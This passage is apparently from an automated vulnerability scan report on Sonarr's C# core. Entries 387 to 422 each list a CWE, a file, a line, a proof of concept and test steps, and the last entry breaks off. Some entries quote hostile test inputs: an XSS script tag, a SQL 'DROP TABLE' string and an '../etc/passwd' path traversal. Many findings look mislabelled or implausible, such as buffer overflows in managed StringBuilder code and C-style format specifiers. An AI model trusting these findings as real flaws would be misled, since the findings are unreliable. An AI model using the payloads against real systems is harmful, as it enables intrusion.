### 387. Improper Access Control (CWE-119)

**File:** src/NzbDrone.Core/Parser/Parser.cs
**Line:** 109

**Description:**
The parser uses static methods and shared regex patterns that could be affected by improper access control in multi-threaded environments.

**Evidence:**
```
The Parser class uses static fields for regex patterns and shared logger instances, which could lead to race conditions in multi-threaded scenarios.
```

**Impact:**
In multi-threaded environments, concurrent access to shared regex patterns or logger instances could lead to inconsistent parsing results or logging issues.

**Proof of Concept:**
In a multi-threaded environment, concurrent parsing operations could potentially interfere with each other's regex matching or logging output.

**How to Test:**
Run concurrent parsing operations with different titles and verify that results are consistent and logging output is not corrupted.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-119_src_NzbDroneCore_Parser_Parsercs.py`
---

### 388. Stack-based Buffer Overflow (CWE-121)

**File:** src/NzbDrone.Core/Parser/Parser.cs
**Line:** 109

**Description:**
The code uses StringBuilder and string operations that could lead to buffer overflow conditions, particularly with very long inputs.

**Evidence:**
```
The ConvertToNumerals method uses StringBuilder with potentially large inputs, and the ParseMatchCollection method processes potentially large match collections.
```

**Impact:**
Very long inputs could cause buffer overflows in string operations, leading to crashes or memory corruption.

**Proof of Concept:**
Processing a title with millions of characters could cause StringBuilder operations to exceed memory limits or cause stack overflow.

**How to Test:**
Test with extremely long titles and measure memory usage. Verify that the application handles large inputs without buffer overflow errors.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-121_src_NzbDroneCore_Parser_Parsercs.py`
---

### 389. Buffer Copy without Checking Size of Input (CWE-120)

**File:** src/NzbDrone.Core/Parser/Parser.cs
**Line:** 109

**Description:**
The code performs buffer operations without checking input sizes, potentially leading to buffer overflows.

**Evidence:**
```
The ConvertToNumerals method and various string operations use StringBuilder without size validation, and the ParseMatchCollection method processes match collections without size checks.
```

**Impact:**
Large inputs could cause buffer overflows, leading to crashes or memory corruption.

**Proof of Concept:**
Processing a title with extremely long strings could cause StringBuilder operations to exceed allocated buffer space.

**How to Test:**
Test with inputs that exceed typical buffer sizes and verify that the application handles oversized inputs gracefully.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-120_src_NzbDroneCore_Parser_Parsercs.py`
---

### 390. Improper Limitation of a Pathname to a Restricted Directory (CWE-22)

**File:** src/NzbDrone.Core/Parser/Parser.cs
**Line:** 109

**Description:**
The parser processes file paths but does not validate that paths are within expected directories, potentially allowing path traversal.

**Evidence:**
```
The ParsePath method uses FileInfo and processes directory names, but there's no validation that paths are within expected boundaries.
```

**Impact:**
If parsed paths are used in file operations, an attacker could potentially access files outside of intended directories.

**Proof of Concept:**
A title containing '../' sequences could be processed in a way that allows access to parent directories when file operations are performed.

**How to Test:**
Test with titles containing path traversal sequences like '../', '../../', etc. Verify that file operations are restricted to intended directories.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_NzbDroneCore_Parser_Parsercs.py`
---

### 391. Use of Externally-Controlled Format String (CWE-134)

**File:** src/NzbDrone.Core/Parser/QualityParser.cs
**Line:** 28

**Description:**
The code uses string interpolation with user-controlled input in the Logger.Debug call without proper sanitization, potentially leading to format string vulnerabilities.

**Evidence:**
```
Logger.Debug("Trying to parse quality for '{0}'", name); - The name parameter is not sanitized before being used in the format string.
```

**Impact:**
An attacker could manipulate the name parameter to inject format specifiers that could cause unexpected behavior or information disclosure.

**Proof of Concept:**
If an attacker can control the 'name' parameter passed to ParseQuality, they could inject format specifiers like '%n' or '%x' that might cause unexpected behavior in logging or potentially be exploited in other contexts.

**How to Test:**
Pass a specially crafted name parameter containing format specifiers to the ParseQuality method and observe if it affects logging behavior or if the format string is processed incorrectly.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-134_src_NzbDroneCore_Parser_QualityParsercs.py`
---

### 392. Improper Neutralization of Input During Web Page Generation ('Web Injection') (CWE-707)

**File:** src/NzbDrone.Core/Parser/QualityParser.cs
**Line:** 100

**Description:**
The code uses string interpolation with user-controlled input in the ToString method of ParsedEpisodeInfo without proper HTML escaping, potentially leading to XSS vulnerabilities.

**Evidence:**
```
The ToString() method in ParsedEpisodeInfo uses string interpolation with user-controlled data without HTML escaping.
```

**Impact:**
If the parsed episode information is displayed in web UI without proper HTML escaping, attackers could inject malicious JavaScript or HTML.

**Proof of Concept:**
If a release title contains '<script>alert(1)</script>' and this is displayed in a web UI without HTML escaping, the script would execute in the user's browser.

**How to Test:**
Create a ParsedEpisodeInfo with a release title containing HTML/JavaScript tags and verify if it's properly escaped when rendered in web UI.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Parser_QualityParsercs.py`
---

### 393. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Parser/QualityParser.cs
**Line:** 108

**Description:**
The ParseQualityName method accepts user input without sufficient validation, potentially leading to unexpected behavior or processing errors.

**Evidence:**
```
The method processes name parameter directly without validating its length or content before regex operations.
```

**Impact:**
Malformed input could cause regex engine to consume excessive resources or lead to unexpected quality parsing results.

**Proof of Concept:**
Passing a very long string (e.g., 10MB) to ParseQualityName could cause regex engine to consume excessive CPU/memory or potentially cause stack overflow.

**How to Test:**
Test ParseQualityName with extremely long input strings and observe resource consumption and potential exceptions.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Parser_QualityParsercs.py`
---

### 394. Information Exposure Through Log Files (CWE-200)

**File:** src/NzbDrone.Core/Parser/QualityParser.cs
**Line:** 28

**Description:**
The code logs user input directly without sanitization, potentially exposing sensitive information in logs.

**Evidence:**
```
Logger.Debug("Trying to parse quality for '{0}'", name); - Logs raw user input without sanitization.
```

**Impact:**
Sensitive information in release names could be exposed in log files, potentially including credentials, paths, or other sensitive data.

**Proof of Concept:**
If a release name contains sensitive information like API keys or paths, this information would be logged directly without sanitization.

**How to Test:**
Pass release names containing sensitive information to ParseQuality and check log output for exposure of sensitive data.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-200_src_NzbDroneCore_Parser_QualityParsercs.py`
---

### 395. Improper Validation of Array Index (CWE-129)

**File:** src/NzbDrone.Core/Parser/Model/ParsedEpisodeInfo.cs
**Line:** 100

**Description:**
The IsPossibleSpecialEpisode property accesses EpisodeNumbers array without proper bounds checking.

**Evidence:**
```
EpisodeNumbers.Length == 1 && EpisodeNumbers[0] == 0 - No bounds checking before accessing EpisodeNumbers[0].
```

**Impact:**
Array index out of bounds exception could occur if EpisodeNumbers array is not properly initialized or has unexpected structure.

**Proof of Concept:**
Create a ParsedEpisodeInfo with EpisodeNumbers array that has no elements and access IsPossibleSpecialEpisode property to trigger potential array index exception.

**How to Test:**
Create ParsedEpisodeInfo with empty EpisodeNumbers array and access IsPossibleSpecialEpisode property to verify bounds checking.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-129_src_NzbDroneCore_Parser_Model_ParsedEpisodeInfocs.py`
---

### 396. Improper Validation of Array Index (CWE-129)

**File:** src/NzbDrone.Core/Parser/Model/ParsedEpisodeInfo.cs
**Line:** 110

**Description:**
The ReleaseType property accesses EpisodeNumbers array without proper bounds checking.

**Evidence:**
```
EpisodeNumbers.Length > 1 or EpisodeNumbers.Length == 1 - No bounds checking before accessing array elements.
```

**Impact:**
Array index out of bounds exception could occur if EpisodeNumbers array is not properly initialized.

**Proof of Concept:**
Create a ParsedEpisodeInfo with EpisodeNumbers array that has no elements and access ReleaseType property to trigger potential array index exception.

**How to Test:**
Create ParsedEpisodeInfo with empty EpisodeNumbers array and access ReleaseType property to verify bounds checking.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-129_src_NzbDroneCore_Parser_Model_ParsedEpisodeInfocs.py`
---

### 397. Allocation of Resources Without Limits or Throttling (CWE-770)

**File:** src/NzbDrone.Core/Parser/QualityParser.cs
**Line:** 100

**Description:**
The code uses regex patterns that could lead to resource exhaustion when processing large inputs.

**Evidence:**
```
Multiple regex patterns with complex alternations and nested groups that could cause exponential backtracking.
```

**Impact:**
Processing specially crafted release names could cause regex engine to consume excessive CPU/memory or potentially cause stack overflow.

**Proof of Concept:**
Create a release name with nested patterns that cause regex engine to perform exponential backtracking, leading to performance degradation or timeout.

**How to Test:**
Test ParseQualityName with release names designed to cause regex backtracking and measure resource consumption.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-770_src_NzbDroneCore_Parser_QualityParsercs.py`
---

### 398. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Tv/RefreshEpisodeService.cs
**Line:** 105

**Description:**
The RefreshEpisodeInfo method processes remote episodes without validating the input data, potentially leading to data corruption or unexpected behavior.

**Evidence:**
```
The method processes episodes from remoteEpisodes parameter without validating the structure or content of the Episode objects, particularly the SeasonNumber and EpisodeNumber properties.
```

**Impact:**
Malformed episode data could cause incorrect episode mapping, data inconsistency, or exceptions during processing.

**Proof of Concept:**
If remoteEpisodes contains episodes with invalid SeasonNumber or EpisodeNumber values, the method might create incorrect episode mappings or throw exceptions during the update process.

**How to Test:**
1. Create a test with remoteEpisodes containing episodes with negative season numbers or episode numbers
2. Verify that the system handles invalid episode data gracefully
3. Check for exceptions or incorrect episode mappings in the database

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Tv_RefreshEpisodeServicecs.py`
---

### 399. Improper Validation of Array Index (CWE-129)

**File:** src/NzbDrone.Core/Tv/RefreshEpisodeService.cs
**Line:** 142

**Description:**
The code accesses episodesPerSeason dictionary without proper validation, which could lead to index out of bounds exceptions.

**Evidence:**
```
The code accesses episodesPerSeason[episodeToUpdate.SeasonNumber] without checking if the key exists, potentially causing KeyNotFoundException.
```

**Impact:**
An invalid season number in episode data could cause the application to crash with an unhandled exception.

**Proof of Concept:**
If an episode has a SeasonNumber that doesn't exist in the seasons collection, accessing episodesPerSeason[episodeToUpdate.SeasonNumber] would throw an exception.

**How to Test:**
1. Create a test series with episodes having invalid season numbers
2. Run the refresh episode service with these episodes
3. Verify that the system handles missing season keys gracefully

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-129_src_NzbDroneCore_Tv_RefreshEpisodeServicecs.py`
---

### 400. Improper Neutralization of Special Elements used in a Command (CWE-77)

**File:** src/NzbDrone.Core/Tv/RefreshEpisodeService.cs
**Line:** 160

**Description:**
The code uses string concatenation for SQL queries without proper parameterization, potentially leading to SQL injection vulnerabilities.

**Evidence:**
```
In the EpisodesWhereCutoffUnmetBuilder method, the BuildQualityCutoffWhereClause method constructs SQL strings using string concatenation without parameterization.
```

**Impact:**
Malicious input in quality cutoff parameters could lead to SQL injection attacks.

**Proof of Concept:**
If the qualitiesBelowCutoff parameter contains malicious SQL in profile IDs or quality IDs, it could be injected into the generated SQL query.

**How to Test:**
1. Create a test with malicious quality cutoff data
2. Call the EpisodesWhereCutoffUnmet method with this data
3. Monitor the generated SQL queries for injection vulnerabilities

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-77_src_NzbDroneCore_Tv_RefreshEpisodeServicecs.py`
---

### 401. Stack-based Buffer Overflow (CWE-121)

**File:** src/NzbDrone.Core/Tv/RefreshEpisodeService.cs
**Line:** 170

**Description:**
The AdjustMultiEpisodeAirTime method processes episodes in a loop without proper bounds checking, potentially leading to buffer overflow issues.

**Evidence:**
```
The method iterates through groups of episodes and modifies AirDateUtc values, but doesn't validate the number of episodes in each group before processing.
```

**Impact:**
Large numbers of episodes in a group could cause unexpected behavior or memory access violations.

**Proof of Concept:**
If a season has an unusually large number of episodes with the same air date, the loop could process more episodes than expected, potentially causing issues with the AirDateUtc calculations.

**How to Test:**
1. Create a test with a season having many episodes with identical air dates
2. Run the AdjustMultiEpisodeAirTime method
3. Verify that the method handles large episode groups correctly

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-121_src_NzbDroneCore_Tv_RefreshEpisodeServicecs.py`
---

### 402. Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') (CWE-22)

**File:** src/NzbDrone.Core/Tv/MoveSeriesService.cs
**Line:** 55

**Description:**
The MoveSeriesService doesn't properly validate paths for directory traversal attacks when moving series directories.

**Evidence:**
```
The MoveSingleSeries method accepts sourcePath and destinationPath without validating that they are within expected directories or sanitizing path components.
```

**Impact:**
An attacker could move series to unexpected locations or access files outside the intended directory structure.

**Proof of Concept:**
An attacker could send a MoveSeriesCommand with sourcePath = '../../../../etc/passwd' to potentially move series to unexpected locations or access sensitive files.

**How to Test:**
1. Send a MoveSeriesCommand with paths containing '../' sequences
2. Verify that the system allows moving to directories outside the expected range
3. Check if the system properly validates path components

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_NzbDroneCore_Tv_MoveSeriesServicecs.py`
---

### 403. Insecure Data Storage (CWE-312)

**File:** src/NzbDrone.Core/Tv/RefreshEpisodeService.cs
**Line:** 188

**Description:**
The code stores episode data including ratings and images without proper validation or sanitization, potentially leading to data corruption or injection issues.

**Evidence:**
```
The RefreshEpisodeInfo method assigns episode data directly from remoteEpisodes without validating the structure or content of ratings and images properties.
```

**Impact:**
Malformed rating or image data could cause data corruption or unexpected behavior in the UI or data processing.

**Proof of Concept:**
If remoteEpisodes contains episodes with malformed ratings or image data, the system might store invalid data or throw exceptions during processing.

**How to Test:**
1. Create test episodes with malformed ratings or image data
2. Run the refresh episode service with these episodes
3. Verify that the system handles invalid data gracefully

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneCore_Tv_RefreshEpisodeServicecs.py`
---

### 404. Deserialization of Untrusted Data (CWE-502)

**File:** src/NzbDrone.Core/Tv/RefreshEpisodeService.cs
**Line:** 105

**Description:**
The RefreshEpisodeService processes remote episodes from external sources without proper deserialization validation, potentially leading to insecure deserialization vulnerabilities.

**Evidence:**
```
The method accepts remoteEpisodes from external sources (likely via API calls) without validating the deserialized objects before processing.
```

**Impact:**
Maliciously crafted episode data could lead to unexpected behavior or potential code execution if the deserialization process is not properly validated.

**Proof of Concept:**
If remoteEpisodes contains specially crafted Episode objects with malicious properties, the system might process them incorrectly or throw exceptions.

**How to Test:**
1. Create test Episode objects with unexpected properties or structures
2. Pass them to RefreshEpisodeInfo method
3. Verify that the system handles unexpected deserialized data gracefully

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-502_src_NzbDroneCore_Tv_RefreshEpisodeServicecs.py`
---

### 405. Improper Output Neutralization for Logs (CWE-117)

**File:** src/NzbDrone.Core/Tv/RefreshEpisodeService.cs
**Line:** 112

**Description:**
The logging statements use string interpolation with user-provided data without proper sanitization, potentially leading to log injection vulnerabilities.

**Evidence:**
```
The logger.Info and logger.Fatal calls use string interpolation with series and episode data that could contain special characters.
```

**Impact:**
Malicious input in series or episode titles could lead to log injection attacks or make log parsing difficult.

**Proof of Concept:**
If a series title contains special log characters like '%' or '
', it could cause log injection or parsing issues.

**How to Test:**
1. Create a series with a title containing special log characters
2. Run the refresh episode service
3. Check if the log output properly handles special characters

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-117_src_NzbDroneCore_Tv_RefreshEpisodeServicecs.py`
---

### 406. Improper Neutralization of Special Elements used in a Command (CWE-707)

**File:** src/NzbDrone.Core/Instrumentation/DatabaseTarget.cs
**Line:** 105

**Description:**
The DatabaseTarget class uses user-provided data in SQL queries without proper sanitization, potentially leading to SQL injection vulnerabilities when handling log messages.

**Evidence:**
```
The Write method in DatabaseTarget.cs constructs SQL commands using string concatenation with user-provided log data (Message, Logger, Exception, ExceptionType, Level) without proper parameterization for all fields.
```

**Impact:**
An attacker could potentially inject malicious SQL into log messages that get stored in the database, leading to data corruption, unauthorized access, or command execution.

**Proof of Concept:**
If a log message contains SQL injection payload like "'; DROP TABLE Logs; --" in the Message field, and this gets stored in the database, it could be exploited during database operations or when retrieving logs.

**How to Test:**
1. Send a log entry with a specially crafted Message field containing SQL injection payload
2. Check if the payload gets stored in the database
3. Try to trigger database operations that might execute the injected SQL

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Instrumentation_DatabaseTargetcs.py`
---

### 407. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Tags/TagService.cs
**Line:** 100

**Description:**
The GetTag method in TagService does not validate the input string before parsing it as an integer, potentially leading to unexpected behavior or exceptions.

**Evidence:**
```
In GetTag(string tag) method, when tag.All(char.IsDigit) returns true, it directly parses the tag string to int without checking if the parsed value is valid or within expected range.
```

**Impact:**
Invalid input could cause parsing exceptions or unexpected behavior when handling tag identifiers.

**Proof of Concept:**
If a tag string like "123abc" is passed to GetTag(), it will return false for tag.All(char.IsDigit) and proceed to GetByLabel(), but if a numeric string like "9999999999" is passed, it might cause overflow or invalid ID issues.

**How to Test:**
1. Call GetTag() with various malformed numeric strings
2. Test with very large numbers that might overflow
3. Verify error handling for non-numeric inputs

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Tags_TagServicecs.py`
---

### 408. Improper Validation of Array Index (CWE-129)

**File:** src/NzbDrone.Core/Tags/TagService.cs
**Line:** 150

**Description:**
The GetAutoTagIds method in TagService might encounter issues with array indexing when processing auto-tag specifications.

**Evidence:**
```
The GetAutoTagIds method iterates through autoTags and their specifications, but doesn't validate that the index or values are within expected bounds when accessing TagSpecification.Value.
```

**Impact:**
Array index out of bounds exceptions could occur when processing auto-tag configurations with malformed data.

**Proof of Concept:**
If an AutoTag specification has a TagSpecification with an invalid Value that causes array indexing issues, it could lead to runtime exceptions.

**How to Test:**
1. Create auto-tag configurations with malformed specifications
2. Call Details() method to trigger GetAutoTagIds processing
3. Monitor for array index exceptions

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-129_src_NzbDroneCore_Tags_TagServicecs.py`
---

### 409. Command Injection (CWE-77)

**File:** src/NzbDrone.Core/Instrumentation/DatabaseTarget.cs
**Line:** 105

**Description:**
The DatabaseTarget class could be vulnerable to command injection through log message handling, particularly when dealing with exception details.

**Evidence:**
```
The Write method in DatabaseTarget.cs processes exception details and stores them in the database, but doesn't properly sanitize these values before insertion.
```

**Impact:**
Malicious log entries with crafted exception details could potentially lead to command execution or data corruption.

**Proof of Concept:**
If an exception with a crafted message containing command injection payloads gets logged, it might be stored and later processed in a way that executes commands.

**How to Test:**
1. Generate exceptions with crafted messages containing command injection payloads
2. Verify that these payloads are stored in the database
3. Check if any processing of stored exception data could lead to command execution

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-77_src_NzbDroneCore_Instrumentation_DatabaseTargetcs.py`
---

### 410. Insecure Data Storage (CWE-312)

**File:** src/NzbDrone.Core/Instrumentation/DatabaseTarget.cs
**Line:** 105

**Description:**
Log data including exception details and messages are stored in the database without proper encryption or sanitization.

**Evidence:**
```
The DatabaseTarget class stores raw log messages, exception details, and logger names in the database without any encryption or sanitization of sensitive information.
```

**Impact:**
Sensitive information from logs could be exposed through database access, potentially including API keys, passwords, or other confidential data.

**Proof of Concept:**
If logs contain sensitive information like API keys or passwords, and the database is accessible to unauthorized users, this information could be extracted directly from the Logs table.

**How to Test:**
1. Check database schema for Logs table structure
2. Insert log entries with sensitive data
3. Verify that sensitive data is stored in plain text
4. Test database access permissions

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneCore_Instrumentation_DatabaseTargetcs.py`
---

### 411. Improper Access Control (CWE-284)

**File:** src/NzbDrone.Core/Tags/TagService.cs
**Line:** 170

**Description:**
The Delete method in TagService does not properly validate access control before allowing tag deletion.

**Evidence:**
```
The Delete method checks if a tag is in use but doesn't validate user permissions or authentication context before performing the deletion operation.
```

**Impact:**
Unauthorized users might be able to delete tags that they shouldn't have access to, potentially affecting system configuration.

**Proof of Concept:**
If an authenticated user with appropriate permissions calls Delete() on a tag, they can delete it even if they don't have full administrative rights.

**How to Test:**
1. Test deletion of tags with different user permissions
2. Verify access control checks are properly enforced
3. Check if deletion bypasses any authorization mechanisms

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-284_src_NzbDroneCore_Tags_TagServicecs.py`
---

### 412. Stack-based Buffer Overflow (CWE-121)

**File:** src/NzbDrone.Core/Instrumentation/DatabaseTarget.cs
**Line:** 105

**Description:**
The DatabaseTarget class might be vulnerable to stack-based buffer overflow when handling large log messages.

**Evidence:**
```
The Write method processes log messages and exception details without size validation, potentially leading to buffer overflows when handling very large inputs.
```

**Impact:**
Large log entries could cause stack buffer overflows, leading to application crashes or potential code execution.

**Proof of Concept:**
If a log message or exception detail exceeds buffer limits, it could cause stack corruption and application instability.

**How to Test:**
1. Generate extremely large log messages
2. Test with very long exception details
3. Monitor for application crashes or memory corruption

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-121_src_NzbDroneCore_Instrumentation_DatabaseTargetcs.py`
---

### 413. Use of Externally-Controlled Format String (CWE-134)

**File:** src/NzbDrone.Core/Instrumentation/DatabaseTarget.cs
**Line:** 105

**Description:**
The DatabaseTarget class uses format strings that could be controlled externally, potentially leading to format string vulnerabilities.

**Evidence:**
```
The CleanseLogMessage.Cleanse method is used to process log messages, but the format string handling in the logging process might not be fully validated.
```

**Impact:**
Maliciously crafted log messages could lead to format string vulnerabilities, potentially causing information disclosure or code execution.

**Proof of Concept:**
If log messages contain format specifiers that are not properly sanitized, they could be exploited to extract memory contents or cause unexpected behavior.

**How to Test:**
1. Send log entries with format specifiers
2. Monitor for unexpected behavior in log processing
3. Test with specially crafted format strings

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-134_src_NzbDroneCore_Instrumentation_DatabaseTargetcs.py`
---

### 414. Cross-Site Request Forgery (CSRF) (CWE-352)

**File:** src/NzbDrone.Core/Tags/TagService.cs
**Line:** 170

**Description:**
The TagService methods lack CSRF protection, making them vulnerable to cross-site request forgery attacks.

**Evidence:**
```
The TagService exposes methods for adding, updating, and deleting tags without CSRF token validation, which could be called from external sources.
```

**Impact:**
An attacker could perform unauthorized tag operations on behalf of authenticated users.

**Proof of Concept:**
If an authenticated user is tricked into visiting a malicious site that sends requests to the TagService endpoints, they could modify or delete tags without their knowledge.

**How to Test:**
1. Test tag operations without CSRF tokens
2. Verify that requests can be made from external domains
3. Check if authentication is sufficient or if CSRF protection is missing

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-352_src_NzbDroneCore_Tags_TagServicecs.py`
---

### 415. Cross-Site Scripting (XSS) (CWE-79)

**File:** src/NzbDrone.Core/Tags/TagDetails.cs
**Line:** 10

**Description:**
The TagDetails class stores label information that could be vulnerable to XSS when displayed in web interfaces.

**Evidence:**
```
The Label property in TagDetails class stores raw label values without HTML escaping, which could be displayed in web UI without proper sanitization.
```

**Impact:**
Malicious labels could lead to XSS vulnerabilities when displayed in web interfaces.

**Proof of Concept:**
If a tag label contains JavaScript code like "<script>alert('XSS')</script>", and this is displayed in a web UI without proper escaping, it could execute the script.

**How to Test:**
1. Create tags with XSS payloads in labels
2. Display these labels in web UI
3. Verify if scripts execute or if data is properly escaped

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_src_NzbDroneCore_Tags_TagDetailscs.py`
---

### 416. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Datastore/BasicRepository.cs
**Line:** 210

**Description:**
The Get method does not validate the ID parameter before using it in a query, potentially leading to unexpected behavior or errors.

**Evidence:**
```
Line 210: var model = Find(id); - The method accepts an ID but doesn't validate if it's a valid integer or within expected ranges.
```

**Impact:**
Invalid IDs could cause unexpected behavior, potentially leading to information disclosure or denial of service if the ID is used in further processing.

**Proof of Concept:**
Calling Get(-1) or Get(0) could potentially cause issues in the Find method or downstream processing, especially if the ID is used in other parts of the system.

**How to Test:**
1. Call Get() method with various invalid ID values (negative numbers, zero, very large numbers). 2. Check if the system handles these gracefully. 3. Monitor for exceptions or unexpected behavior.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Datastore_BasicRepositorycs.py`
---

### 417. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Datastore/BasicRepository.cs
**Line:** 220

**Description:**
The Get method does not validate the IDs parameter in the Get(IEnumerable<int> ids) method, potentially leading to unexpected behavior or errors.

**Evidence:**
```
Line 220: var result = Query(x => ids.Contains(x.Id)); - The method accepts an IEnumerable<int> but doesn't validate the contents or size of the collection.
```

**Impact:**
Invalid or malicious ID collections could cause unexpected behavior, potentially leading to information disclosure or denial of service.

**Proof of Concept:**
Calling Get() with a collection containing invalid IDs or extremely large collections could cause performance issues or unexpected behavior.

**How to Test:**
1. Call Get() method with various invalid ID collections (empty, null, very large collections). 2. Check if the system handles these gracefully. 3. Monitor for performance issues or exceptions.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Datastore_BasicRepositorycs.py`
---

### 418. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Datastore/BasicRepository.cs
**Line:** 236

**Description:**
The InsertMany method does not validate the models parameter, potentially leading to unexpected behavior or errors.

**Evidence:**
```
Line 236: if (models.Any(x => x.Id != 0)) - The method checks for existing IDs but doesn't validate the models themselves.
```

**Impact:**
Invalid model data could cause database insertion failures or data corruption if models are not properly validated before insertion.

**Proof of Concept:**
Calling InsertMany() with models that have invalid property values could lead to database constraint violations or unexpected behavior.

**How to Test:**
1. Call InsertMany() with various invalid model collections. 2. Check if the system handles invalid models gracefully. 3. Monitor for database constraint violations.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Datastore_BasicRepositorycs.py`
---

### 419. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Datastore/BasicRepository.cs
**Line:** 246

**Description:**
The UpdateMany method does not validate the models parameter, potentially leading to unexpected behavior or errors.

**Evidence:**
```
Line 246: if (models.Any(x => x.Id == 0)) - The method checks for zero IDs but doesn't validate the models themselves.
```

**Impact:**
Invalid model data could cause database update failures or data corruption if models are not properly validated before updating.

**Proof of Concept:**
Calling UpdateMany() with models that have invalid property values could lead to database constraint violations or unexpected behavior.

**How to Test:**
1. Call UpdateMany() with various invalid model collections. 2. Check if the system handles invalid models gracefully. 3. Monitor for database constraint violations.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Datastore_BasicRepositorycs.py`
---

### 420. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Datastore/BasicRepository.cs
**Line:** 268

**Description:**
The GetPaged method does not validate the pagingSpec parameter, potentially leading to unexpected behavior or errors.

**Evidence:**
```
Line 268: pagingSpec.Records = GetPagedRecords(PagedBuilder(), pagingSpec, PagedQuery); - The method accepts a pagingSpec but doesn't validate its contents.
```

**Impact:**
Invalid paging specifications could cause unexpected behavior, potentially leading to information disclosure or denial of service.

**Proof of Concept:**
Calling GetPaged() with invalid paging specifications (negative page numbers, very large page sizes) could cause performance issues or unexpected behavior.

**How to Test:**
1. Call GetPaged() with various invalid paging specifications. 2. Check if the system handles these gracefully. 3. Monitor for performance issues or exceptions.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Datastore_BasicRepositorycs.py`
---

### 421. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Datastore/BasicRepository.cs
**Line:** 276

**Description:**
The AddFilters method does not validate the filter expressions, potentially leading to unexpected behavior or errors.

**Evidence:**
```
Line 276: foreach (var filter in filters) - The method processes filter expressions without validation.
```

**Impact:**
Invalid filter expressions could cause database query failures or unexpected behavior in the filtering logic.

**Proof of Concept:**
Passing invalid filter expressions to AddFilters() could lead to database query errors or incorrect filtering results.

**How to Test:**
1. Test AddFilters() with various invalid filter expressions. 2. Check if the system handles these gracefully. 3. Monitor for database query errors.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Datastore_BasicRepositorycs.py`
---

### 422. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Datastore/TableMapper.cs
**Line:** 100

**Description:**
The IsValidSortKey method does not validate the sortKey parameter, potentially leading to unexpected behavior or errors.

**Evidence:**
```
Line 100: return _allowedOrderBy.Contains(sortKey) - The method accepts a sortKey but doesn't validate its format or contents.
```

**Impact:**
Invalid sort keys could cause database query failures or unexpected behavior in the sorting logic.

**Proof of Concept:**
Passing invalid sort keys to IsValidSortKey() could lead to incorrect validation results or database query errors.

**How to Test:**
